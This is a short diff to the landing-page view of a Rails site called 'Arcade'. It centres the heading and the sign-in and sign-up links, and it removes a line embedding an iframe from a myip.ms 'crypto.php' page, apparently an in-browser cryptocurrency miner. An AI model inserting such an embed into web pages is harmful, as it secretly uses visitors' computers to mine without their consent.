@@ -1,12 +1,14 @@
 <div class="jumbotron">
-<h1>Welcome to Arcade!</h1>
+<center><h1>Welcome to Arcade!</h1></center>
 
+<center>
+<p>
 <% if user_signed_in? %>
   <%= link_to 'Account Console', user_path(@user) %>
 <% else %>
   <%= link_to 'Sign In', new_user_session_path %>
   <%= link_to 'Sign Up', new_user_registration_path %>
 <% end %>
+</p>
 </div>
-
-<div align="left"><iframe width="750" height="350" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="http://myip.ms/crypto.php?m=7777"></iframe><a href="http://myip.ms/"></a></div>
+</center>
